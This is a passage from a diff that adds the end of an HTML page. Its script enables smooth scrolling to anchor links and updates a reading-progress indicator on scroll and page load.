+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Initialize
+        window.addEventListener('scroll', updateReadingProgress);
+        window.addEventListener('load', updateReadingProgress);
+    </script>
+</body>
+</html>
